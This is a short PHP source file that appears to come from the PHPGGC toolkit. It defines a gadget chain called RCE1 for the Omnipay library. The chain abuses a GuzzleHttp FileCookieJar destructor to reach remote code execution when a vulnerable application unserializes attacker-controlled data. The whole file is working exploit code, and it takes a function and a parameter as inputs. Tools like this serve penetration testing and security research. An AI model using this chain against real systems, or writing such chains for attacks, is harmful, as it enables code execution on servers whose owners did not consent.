<?php

namespace GadgetChain\Omnipay;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.0.0 & 3.2.0 <= dev-master';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \GuzzleHttp\Cookie\FileCookieJar($function,$parameter);
    }
}